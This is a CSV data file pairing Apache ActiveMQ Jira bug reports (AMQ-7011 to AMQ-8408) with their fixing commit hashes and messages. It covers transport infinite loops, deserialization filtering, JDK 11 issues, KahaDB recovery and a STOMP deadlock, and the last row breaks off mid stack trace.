bug id,bug key,bug description,commit hash,commit msg
13407920,AMQ-8408,<NA>,2647500b3f10e7c57aef8018788158e1b9d3b2c2,[AMQ-8408] Add noee on activemq-web-console bundle
13363870,AMQ-8183,"There is a regression caused by AMQ-7106 that can lead to an infinite loop and high cpu usage when using the nio+ssl transport if maxFrameSize is configured. The issue shows up when several messages come into the broker that exceed the max frame size. The broker properly detects the error and kills the connection in another thread but the transport thread can get stuck in an infinite loop inside serviceRead() method of NIOSSLTransport.

It's a bit hard to tell what is going on but the issue appears to be due to the fact that the transport has already been stopped but there's no condition being hit to break the loop. The transport logic appears to get into a weird state trying to process a partial frame in a local buffer in the serviceRead() method but the logic just keeps spinning and never tries to re-read from the socket because the currentBuffer in the transport is wasn't allocated due to the async shutdown.

The fix here is pretty simple and that is to check if the transport has been stopped and exit the loop. I have only seen this with OpenWire and nio+ssl but the fix I'm adding will work for all nio+ssl and nio transports.",944ca6c7e1dc4f44b61ce05b77c180c686e2ae76,"AMQ-8183 - prevent infinite loop when maxFrameSize is exceeded

This makes sure the nio transport thread properly terminates if
maxFrameSize is exceeded with OpenWire to prevent an infinite loop that
uses up all the cpu"
13363870,AMQ-8183,"There is a regression caused by AMQ-7106 that can lead to an infinite loop and high cpu usage when using the nio+ssl transport if maxFrameSize is configured. The issue shows up when several messages come into the broker that exceed the max frame size. The broker properly detects the error and kills the connection in another thread but the transport thread can get stuck in an infinite loop inside serviceRead() method of NIOSSLTransport.

It's a bit hard to tell what is going on but the issue appears to be due to the fact that the transport has already been stopped but there's no condition being hit to break the loop. The transport logic appears to get into a weird state trying to process a partial frame in a local buffer in the serviceRead() method but the logic just keeps spinning and never tries to re-read from the socket because the currentBuffer in the transport is wasn't allocated due to the async shutdown.

The fix here is pretty simple and that is to check if the transport has been stopped and exit the loop. I have only seen this with OpenWire and nio+ssl but the fix I'm adding will work for all nio+ssl and nio transports.",2712464b78f76affd34cc0b097a2248f211ea0c7,"AMQ-8183 - apply maxFrameSize high cpu usage fix to Auto nio transport
also"
13356519,AMQ-8138,"On a broker recently upgraded to 5.16.1, I've seen the following warning:
{code}
2021-02-03 16:21:00,745 [ActiveMQ NIO Worker 9] WARN ProtocolConverter - Exception occurred for client null (null) processing: SEND -> org.apache.activemq.transport.stomp.ProtocolException: Not connected.
{code}

This looks a lot like AMQ-7444.

If possible, it would be good to log client IP information for this warning too.",2e169f0bc3db3e16fe2928ac03b3308c69b5e72a,[AMQ-8138] Set client IP address with Stomp host header
13350828,AMQ-8117,"Dear,

The VirtualSelectorCacheBrokerPlugin throws an error in the following method:
{code:java}
if (!(desc.getName().equals(""java.lang.String"") || desc.getName().startsWith(""java.util.""))) {
 throw new InvalidClassException(""Unauthorized deserialization attempt"", desc.getName());
 }
{code}
This exception is thrown because there are some lines in the selector cache file that do not match the given ""startsWith(""java.util."")"". The code will throw an exception because of the ""[L"" prefix in front of some java.util. elements in the file:

!image-2021-01-07-09-36-50-044.png!

My activemq.xml and file.data are attached to this ticket.

The selector cache is working fine if I use ActiveMQ version 5.15.11 or below.

I have tried to add jdk.serialFilters for the Concurrent Hashmap, like:

wrapper.java.additional.13=-Djdk.serialFilter=java.util.** (wrapper.conf) and also tried to add this to the java security file, but that did not work.

I hope this issue can be fixed or if it is not a bug, the documentation can be complemented with some notes on how to configure this filters the right way.

Best regards,

Joost",7ca7118a9544fd6b2aac4dd72fd3a6edc3369aca,AMQ-8117 - Allow java.util arrays for deserialization
13346432,AMQ-8104,"If audit log is turned on then Pause Queue doesn't work and causes java.lang.NullPointerException.

*Steps to reproduce:*
 1. Start ActiveMQ normally with audit log turned on: ./activemq start -Dorg.apache.activemq.audit=true
 2. Create a Queue normarlly: [http://127.0.0.1:8161/admin/] > Queues > Enter Queue Name > Create 
 3. Pause newly created queue: Click on `Pause`.

*Expected result:*
 - Queue is paused normally.

*Achieved result:* 
 - Error in web console:
 Error! Exception occurred while processing this request, check the log for more information!
!Screen Shot 2020-12-16 at 9.51.20 AM.png!
 - Error in the `activemq.log`:
{code:java}
 2020-12-16 09:50:41,877 | INFO  | Starting Jetty server | org.apache.activemq.transport.WebTransportServerSupport | main2020-12-16 09:50:41,992 | INFO  | Creating Jetty connector | org.apache.activemq.transport.WebTransportServerSupport | main2020-12-16 09:50:42,124 | WARN  | ServletContext@o.e.j.s.ServletContextHandler@5e4bd84a{/,null,STARTING} has uncovered http methods for path: / | org.eclipse.jetty.security.SecurityHandler | main2020-12-16 09:50:42,199 | INFO  | Listening for connections at ws://3c22fb843faa.ant.amazon.com:61614?maximumConnections=1000&wireFormat.maxFrameSize=104857600 | org.apache.activemq.transport.ws.WSTransportServer | main2020-12-16 09:50:42,201 | INFO  | Connector ws started | org.apache.activemq.broker.TransportConnector | main2020-12-16 09:50:42,203 | INFO  | Apache ActiveMQ 5.15.14 (localhost, ID:3c22fb843faa.ant.amazon.com-55549-1608141041704-0:1) started | org.apache.activemq.broker.BrokerService | main2020-12-16 09:50:42,204 | INFO  | For help or more information please see: http://activemq.apache.org | org.apache.activemq.broker.BrokerService | main2020-12-16 09:50:42,937 | INFO  | ActiveMQ WebConsole available at http://0.0.0.0:8161/ | org.apache.activemq.web.WebConsoleStarter | main2020-12-16 09:50:42,938 | INFO  | ActiveMQ Jolokia REST API available at http://0.0.0.0:8161/api/jolokia/ | org.apache.activemq.web.WebConsoleStarter | main2020-12-16 09:51:04,036 | WARN  | /admin/pauseDestination.action | org.eclipse.jetty.server.HttpChannel | qtp1803093683-37javax.servlet.ServletException: javax.servlet.ServletException: org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.NullPointerException at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:162)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.Server.handle(Server.java:516)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:388)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:633)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:380)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:273)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:105)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:336)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:313)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:171)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:375)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:773)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:905)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at java.lang.Thread.run(Thread.java:748)[:1.8.0_272]{code}",651c5ff2cfe72c0de5f4f486c965cdbb80ceba0d,"- Tests AMQ-8104
- Fixes AMQ-8104"
13337895,AMQ-8060,"Hi All,

We are trying to migrate from version 5.15.11 on 5.16.0.

And we have faced with an error with loading the activemq.xml:

2020-10-28 20:27:13,271 | ERROR | Failed to load: class path resource [activemq.xml], reason: Line 126 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException; lineNumber: 126; columnNumber: 163; cvc-complex-type.3.2.2: Attribute 'allowLinkStealing' is not allowed to appear in element 'transportConnector'. | org.apache.activemq.xbean.XBeanBrokerFactory | main
 org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 126 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException; lineNumber: 126; columnNumber: 163; cvc-complex-type.3.2.2: Attribute 'allowLinkStealing' is not allowed to appear in element 'transportConnector'.

As I can see the problem is that we are using XML validation with referring on generic XSD, like this:
{code:xml}
<beans
 xmlns=""http://www.springframework.org/schema/beans""
 xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
 xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
 http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">{code}
And allowLinkStealing attribute is absent in the new versions of the XSD (generic and activemq-core-5.16.0.xsd).

While allowLinkStealing property is still available for Transport configuration why it was excluded from XSD?",0146d5eb3e69e086ec19df1df1b2b7966c644d26,[AMQ-8060] Re add allowLinkStealing on transport connector for backward compatibility
13325918,AMQ-8032,"If the broker configuration contains runtimeConfigurationPlugin like this:
{code:java}
<broker ...>
 ...
         <plugins>
          <runtimeConfigurationPlugin checkPeriod=""1000""/>
        </plugins>
  ...
</broker>{code}
the broker doesn't start due to:
{code:java}
Caused by: java.lang.NoClassDefFoundError: javax/xml/bind/JAXBException
        at org.apache.activemq.plugin.RuntimeConfigurationPlugin.installPlugin(RuntimeConfigurationPlugin.java:38)
        at org.apache.activemq.broker.BrokerService.addInterceptors(BrokerService.java:2505)
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:2365)
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:1053)
        at org.apache.activemq.broker.BrokerService.getAdminConnectionContext(BrokerService.java:2636)
        at org.apache.activemq.broker.BrokerService.startVirtualConsumerDestinations(BrokerService.java:2797)
        at org.apache.activemq.broker.BrokerService.startDestinations(BrokerService.java:2627)
        at org.apache.activemq.broker.BrokerService.doStartBroker(BrokerService.java:747)
        at org.apache.activemq.broker.BrokerService.startBroker(BrokerService.java:741)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:644)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:73)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:566)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1748)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1685)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1615)
        ... 27 more
Caused by: java.lang.ClassNotFoundException: javax.xml.bind.JAXBException
        at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:471)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:588)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:521)
        ... 45 more {code}
The problem is in the JAXB version in use. A simple workaround is to add JAXB (API and Core) in activemq/lib (I'm testing the fix).

So, it could be just a question of documentation to add JAXB jar in ActiveMQ in order to use runtimeConfigurationPlugin.",9b6a48ad31b2fb4b3a5a129d4ed6119024c6850a,[AMQ-8032] Add JAXB in lib by default to avoid issue with JDK11
13313251,AMQ-7505,"The following files don't contain the license header:

activemq-web/src/main/resources/org/apache/activemq/web/prototype.js
activemq-unit-tests/src/test/java/org/apache/activemq/usecases/QueueBrowsingDisableConcurrentStoreAndDispatchTest.java
activemq-unit-tests/src/test/java/org/apache/activemq/usecases/UsageBlockedDispatchConcurrentStoreAndDispatchFalseTest.java",5901d9a6f0b66f68de75944638f23f4b9676a319,AMQ-7505 - Adding missing license headers to two source files
13310973,AMQ-7497,"Inbound MDBs supported by endpoint workers in the RAR support reconnect and failover with maxReconnects=0. In this way the failover transport can support the use of multiple brokers.
The failover url with no reconnects will leave the resource adapter single xaResource connection in an invalid state after disconnect and will cause periodic recovery to fail.
The single RA wide xaResource should reconnect any failed connection on subsequent usage.",a7b06c043c34978125b57016a8bd82d9bb2fa6a5,AMQ-7497 - tidy up test cleanup for random order runs
13310973,AMQ-7497,"Inbound MDBs supported by endpoint workers in the RAR support reconnect and failover with maxReconnects=0. In this way the failover transport can support the use of multiple brokers.
The failover url with no reconnects will leave the resource adapter single xaResource connection in an invalid state after disconnect and will cause periodic recovery to fail.
The single RA wide xaResource should reconnect any failed connection on subsequent usage.",8cc5386fbbe7a836ac9aef3cffcb56c0b9f65adc,AMQ-7497 - further test to verify behaviour after ra.stop
13302787,AMQ-7476,"Since the merge of PR #277 ([https://github.com/apache/activemq/pull/277]), when using a proxy, we get:
{code:java}
 I/O exception (org.apache.http.conn.UnsupportedSchemeExce      ption) caught when processing request to ... - http protocol is not supported{code}",910a028fa7dd9659044f4e44392197830d9b463e,[AMQ-7476] Add http schema in the HTTP registry
13288498,AMQ-7429,"The upgrade to Shiro 1.5.x brings Spring 5.1.x but we still use Spring 4.2.x. It's not a problem but spring-expression comes from Shiro and so it's not aligned with other Spring artifacts version.

I'm fixing.",cb23db5c5deb33b2201ba5aa13847d470c2317de,[AMQ-7429] Align spring-expression version with other spring artifacts
13284062,AMQ-7400,<NA>,b7dca5e0738639f2bffe7f97b9c782372fc2188e,[AMQ-7400] Fix OSGi statement about sun.rmi
13283826,AMQ-7399,"To avoid potential security issue when using {{ObjectMessage}}, {{SERIALIZABLE_PACKAGE}} should be limited by default. Now, it contains {{java.lang, ...}}",8cdddde5b47f06d5bc9d1c27e25287bc050799c6,AMQ-7399 - Adding a unit test
13275090,AMQ-7368,"In Statements.java, we have the following query:
{code:java}
public String getFindNextMessagesStatement() {
    if (findNextMessagesStatement == null) {
        findNextMessagesStatement = ""SELECT ID, MSG FROM "" + getFullMessageTableName()
                                    + "" WHERE CONTAINER=? AND ID < ? AND ID > ? AND XID IS NULL ORDER BY ID"";
    }
    return findNextMessagesStatement;
} {code}
This statement is used in {{DefaultJDBCAdapter}} in the {{doRecoverNextMessages()}}.

In this method, we do:
{code:java}
s.setMaxRows(Math.min(maxReturned, maxRows)); {code}
{{setMaxRows}} is supposed to limit the number of rows. However, it doesn't seem to prevent the concrete SQL executed on the database side.

It means that we have a huge huge impact on performance (especially with lot of pending messages).



To avoid this performance issue, the findNextMessagesStatement select statement should use limit (with the same value of {{setMaxRows}}).

As it's more ""postgresql"" specific (any database supporting limit should do the same), we can update PostgreSQLJDBCAdapter to use limit.

It's not yet fully clear to me if the issue if about the PostgreSQL JDBC driver (bad ""translation"" of the {{setMaxRows()}}) or just the ActiveMQ select statement should use limit. ",61bf624c6dd5a999dc9dd1f900bffc6c4feb9fa1,"[AMQ-7368] Add limitQuery in HSQL, MySQL and PostgreSQL JDBC adapters"
13264420,AMQ-7327,"The {{ws}} transport connector uses the {{maxFrameSize}} to set binary and text message size limit.
However the {{http}} transport connector doesn't and the user needs a hack on {{jetty.xml}}.
The {{http}} transport connector should directly use the {{maxFrameSize}}.",50a94cbf12f6a4b9d623b07515b9fd86c53efb13,[AMQ-7327] Use maxFrameSize to limit HTTP content length
13236391,AMQ-7219,"Hi,

 

Sending non persistent messages on a Transacted session is causing activeMQ to keep and replay (on startup) unnecessary journal files. If all messages are in this situation activemq will replay the whole journal file even with a clean shutdown.

 The problem is because is if the transaction has no persistent operation, the metadata.lastUpdate is never updated.

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/MessageDatabase.java#L1400]",bce979349ea9be499d1a686582e8638d369251d1,AMQ-7219 - ActiveMQ replays journal file on a clean/unclean shutdown with transacted session + Non persistent Messages
13233006,AMQ-7201,"SUBJ, when creating a broker instance with `activemq create` the generated admin script bin/<instancename> is missing shebang line.",b11b9aac7515ce897c216b472770bf3cf4734847,AMQ-7201 added shebang to generated broker admin script
13232308,AMQ-7196,"I had a broker with lots of scheduled messages and I noticed that during startup (clean or unclean) the broker was reading the whole index file and storing it os memory:

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerImpl.java#L665]

In order to prevent the OOM, I changed this method to return a Iterator<JobLocation> instead of a List<JobLocation> avoiding load all this data into the heap.

 

I also noticed that during the startup we read the index at least 3 times:

 

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L829]

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L857]

and 

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L940]

 

Probably we can optimize this but this should be another Jira (also maybe we dont need to call recover(tx) when its a clean shutdown)

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L787]",dc35218a2d766a86a78376bfd4b51e7ae5bda935,AMQ-7196 - fix broken test; recovery not applicable to inmemory store
13231289,AMQ-7193,"occasional NPE on duplex network bridge start, dispatch during startup issue. NPE
{code:java}
2019-05-02 16:16:25,116 [0.1:53461@53456] - WARN DemandForwardingBridgeSupport - Network connection between vm://B1#10 and tcp:///127.0.0.1:53461@53456 shutdown due to a remote error: {}
java.lang.NullPointerException
 at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:815)
 at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:238)
 at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
 at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
 at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)
 at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)
 at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
 at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
 at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
 at java.lang.Thread.run(Thread.java:748)
 {code}",7404b43f2d9c5bbf4ab4ec89ae111d5bf1527d82,"AMQ-7193 - resolve intermittent NPE on duplex network connector start; wait for start completion before dispatching inbound messages, fix and test"
13220055,AMQ-7163,"Hi,

This is related to AMQ-7082.

If the broker had an unclean shutdown and the recovery thread didn't find any free pages (newFreePages is empty the recovery), the broker will have a second unclean shutdown - and this will happens to any future restart as long as the number of free pages is = 0 

 

See:

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L484]

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L584]

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L527]

 ",cd1d5eb785a759d285652551f1984ce9877a1192,"AMQ-7163 - If the broker had an unclean shutdown and number of free pages is Zero after the recovery, the next shutdown will also be 'unclean'"
13209200,AMQ-7135,"When removing (delete) a destination using the console an error is reported. It appears all the page files are batched into memory.  If you have a large set of page files and a relatively small heap, this will cause the system to run out of memory. 

This can be reproduced by doing the following:

env: heap size: 384MB

1. Create a “test” queue and send more than 2 millions of persistent messages with size of 100KB to the “test”queue (this take some times). 
2. Delete “test” queue by clicking “delete” button on ActiveMQ Console. 
3. Wait and broker will die eventually. 
4. Broker won’t reboot successfully

The observed error below can be seen in the logs. 

{{org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.OutOfMemoryError: GC overhead limit exceeded}}
{{ at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:982)[spring-webmvc-4.3.18.RELEASE.jar:4.3.18.RELEASE]}}",5c23dd53ad3d40e80273f48ab36afda00186736e,"AMQ7135 : do a purge before deleting the destination

(cherry picked from commit 9f513f88781667df1a2a4b0a85153059dc097295)"
13207174,AMQ-7125,"AMQ broker does not send the error frame back to the WebSocket client when an empty destination is sent with a stomp subscribe frame. Only the connection is terminated. 

As per stomp specification:

""If the server cannot successfully create the subscription, the server MUST send the client an ERROR frame and disconnect the client.""

[https://stomp.github.io/stomp-specification-1.1.html#SUBSCRIBE]

 ",b10458e2c69aa8743e6606948a13dcf27dca1ccc,AMQ-7125 Broker does not send error frame when an empty destination is sent with a stomp subscribe frame
13203030,AMQ-7121,"We are trying to run a broker in JDK 11 and run into the following exception:
{code:java}
2018-12-07 12:44:41,363 ERROR main o.a.a.u.IntrospectionSupport Could not set property soTimeout on ServerSocket[addr=/0:0:0:0:0:0:0:0,localport=9505]
java.lang.IllegalAccessException: class org.apache.activemq.util.IntrospectionSupport cannot access a member of class sun.nio.ch.ServerSocketAdaptor (in module java.base) with modifiers ""public""
at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361)
at java.base/java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:591)
at java.base/java.lang.reflect.Method.invoke(Method.java:558)
at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:184)
at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:155)
at org.apache.activemq.transport.tcp.TcpTransportServer.configureServerSocket(TcpTransportServer.java:187)
at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:142)
at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:62)
at org.apache.activemq.transport.TransportFactorySupport.bind(TransportFactorySupport.java:40)
at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:318)
at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:141){code}
Note that we also see
{code:java}
Could not set property reuseAddress ...{code}
These are caused by {{sun.nio.ch.ServerSocketAdaptor}} becoming a non-public class in JDK 11 (if not earlier).

It can be fixed simply by having {{IntrospectionSupport.setProperty}} call {{setter.setAccessible(true)}} before it invokes any methods on it.

Otherwise we find our local broker runs perfectly fine. ",88525ce650e0843b555b1ef45834435ef719d2f6,[AMQ-7121] Set setter accessible (for JDK 11)
13201770,AMQ-7118,"KahaDB store limit can be exceeded with durable subscribers.

AMQ with store limit set, we can observe that the usage continues to increase AFTER PFC is engaged. Given time, this growth stabilizes. The issue of having exceeded the store limit remains.

See below output from KahaDB dump in attachments:

This appears to be caused by checkpointAckMessageFileMap. The log files are not GC'd, and the KAHA_ACK_MESSAGE_FILE_MAP_COMMAND is replicated and the DB log files continue to expand - this can become exponential. Side effect of also not checking storage size in checkpoint update can cause the DB log files to exceed any set limits. The real critical part is the duplicated and leaking Kaha messages which appears to happen with durable subscribers.

 

 

 ",273afef47c9fef5258cc297ae7353b705db3efb6,"AMQ-7118 - Override hostname for naming to allow tests to apss on all
platforms"
13193696,AMQ-7085,"I have an application using ActiveMQ and have a situation where a producer is blocked with this log message due to the temp usage limit being hit:
{noformat}
[ActiveMQ Transport: tcp:///aaa.bbb.ccc.ddd:65119@64759] 82567721 INFO  org.apache.activemq.broker.region.Queue - Usage(Main:temp:queue://aaabbb:temp) percentUsage=99%, usage=61771109932, limit=61771104256, percentUsageMinDelta=1%;Parent:Usage(Main:temp) percentUsage=100%, usage=61771109932, limit=61771104256, percentUsageMinDelta=1%: Temp Store is Full (99% of 61771104256). Stopping producer (ID:aaaaa-3:1:1:1) to prevent flooding queue://aaabbb. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 8512s){noformat}
In the past I have been able to use JConsole and update the broker's TempLimit value to a higher value to allow things to continue.
 
However on this occasion, the messages above when output again show that the parent's temp limit has updated however the child's limit (the queue) is unchanged.  So it seems the broker's TempUsage does not know about the queue's TempUsage. 
 
In looking at the code.. it seems a child Usage class has to call start() in order for this parent -> children link to be established and for parent limit changes to be propagated down to children.  However the Queue start() method doesn't call systemUsage.getTempUsage().start() for some reason (or even just systemUsage.start()).
 
Is this a bug?
 
DestinationView sadly does not expose setTempLimit() either so this wasn't an option either.
 
From Queue:
{code:java}
    @Override
    public void start() throws Exception {
        if (started.compareAndSet(false, true)) {
            if (memoryUsage != null) {
                memoryUsage.start();
            }
            if (systemUsage.getStoreUsage() != null) {
                systemUsage.getStoreUsage().start();
            }
            systemUsage.getMemoryUsage().addUsageListener(this);
            messages.start();
            if (getExpireMessagesPeriod() > 0) {
                scheduler.executePeriodically(expireMessagesTask, getExpireMessagesPeriod());
            }
            doPageIn(false);
        }
    }{code}
   ",daea192eefe683a8cba63b5136dc8c2b39722cfe,"AMQ-7085 - Properly start TempUsage inside Queue start

This fix allows temp usage changes to the broker temp usage to propagate
properly to a Queue's temp usage settings

Patch applied with thanks to David Sitsky"
13189438,AMQ-7067,"KahaDB Recovery can experience a dangling transaction when prepare and commit occur on different data files.

Scenario:

A XA Transaction is started, message is prepared and sent into Broker.

We then send into broker enough messages to file page file (100 message with 512 * 1024 characters in message payload). This forces a new data file to be created.

Commit the XA transaction. Commit will land on the new data file.

Restart the Broker.

Upon restart a KahaDB recovery is executed.

The prepare in PageFile 1 is not matched to Commit on PageFile 2, as such, it will appear in recovered message state.

Looking deeper into this scenario, it appears that the commit message is GC'd, hence the prepare & commit can not be matched.

The MessageDatabase only checks the following for GC:

{color:#808080}// Don't GC files referenced by in-progress tx{color}{color:#cc7832}if {color}(inProgressTxRange[{color:#6897bb}0{color}] != {color:#cc7832}null{color}) {
 {color:#cc7832}for {color}({color:#cc7832}int {color}pendingTx=inProgressTxRange[{color:#6897bb}0{color}].getDataFileId(){color:#cc7832}; {color}pendingTx <= inProgressTxRange[{color:#6897bb}1{color}].getDataFileId(){color:#cc7832}; {color}pendingTx++) {
 gcCandidateSet.remove(pendingTx){color:#cc7832};{color} }
 }

We need to become aware of where the prepare & commits occur in pagefiles with respect to GCing files.",8e5d539665519629139633e324a672b0a415d4b2,AMQ-7067 - add missing license header
13172927,AMQ-7013,"XATransactionID hash function may generate duplicates.

Scenario:

XID formatId, GlobalTransaction, and BranchQualifier values are identical for many entries. We need to use a better hash function to avoid populating a map with many entries in the same bucket (results in bucket having O(n) performance on recovery).

Example using existing Hash Function:
2018-07-18 06:13:29,866 | INFO  | Recovering from the journal @1:28 | org.apache.activemq.store.kahadb.MessageDatabase | main
2018-07-18 06:23:04,070 | INFO  | @2:484592, 100000 entries recovered .. | org.apache.activemq.store.kahadb.MessageDatabase | main
2018-07-18 06:23:04,099 | INFO  | Recovery replayed 100453 operations from the journal in 574.233 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main 

Using JenkinsHash:
2018-07-18 10:58:43,713 | INFO  | Recovering from the journal @1:28 | org.apache.activemq.store.kahadb.MessageDatabase | main
2018-07-18 10:58:51,302 | INFO  | @2:484592, 100000 entries recovered .. | org.apache.activemq.store.kahadb.MessageDatabase | main
2018-07-18 10:58:51,329 | INFO  | Recovery replayed 100453 operations from the journal in 7.618 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main",063d21f88062a09b7efc1669608cbbacdeb11aac,[AMQ-7013] Adding unit test
13172266,AMQ-7011,"Activemq 5.15.4 Stomp protocol allowed to enter deadlock via dispatch sync.

Scenario:

Stomp client setting the following:
header.put(""id"", subId);
header.put(""activemq.dispatchAsync"", ""false"");

The setup of locks between TopicSubscription and MutexTransport while using Stomp in sync mode can result in a Deadlock as found below (Add and Destroy calls processing), each lock is identified by a + or * to show lock order in each stack trace.

  Found one Java-level deadlock:
=============================
""ActiveMQ Transport: tcp:///127.0.0.1:58303@61613"":
  waiting to lock monitor 0x00007f9c565d4d28 (object 0x00000007acc44708, a java.lang.Object),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:58302@61613""
""ActiveMQ Transport: tcp:///127.0.0.1:58302@61613"":
  waiting for ownable synchronizer 0x00000007ac872730, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:58303@61613""
Java stack information for the threads listed above:
===================================================
""ActiveMQ Transport: tcp:///127.0.0.1:58303@61613"":
++++++  at org.apache.activemq.broker.region.TopicSubscription.destroy(TopicSubscription.java:757)
    - waiting to lock <0x00000007acc44708> (a java.lang.Object)
